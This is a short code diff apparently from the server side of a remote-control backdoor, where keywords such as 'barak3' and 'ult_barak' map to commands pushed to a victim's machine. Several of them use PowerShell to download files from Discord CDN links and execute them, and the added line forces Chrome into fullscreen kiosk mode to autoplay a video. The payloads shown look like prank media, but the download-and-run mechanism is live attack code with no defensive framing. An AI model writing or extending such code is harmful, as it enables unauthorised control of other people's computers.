@@ -32,6 +32,8 @@ while True:
 		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://media.discordapp.net/stickers/865029615457271828.png?size=160', 'barak.png');./barak.png"
 	elif command_to_send == "barak3":
 		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4"
+	elif command_to_send == "barak3.5":
+		command_to_send = "start chrome -kiosk -fullscreen --no-user-gesture-required https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4"
 	elif command_to_send == "barak4":
 		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png', 'barak4.png');./barak4.png"
 	elif command_to_send == "ult_barak":
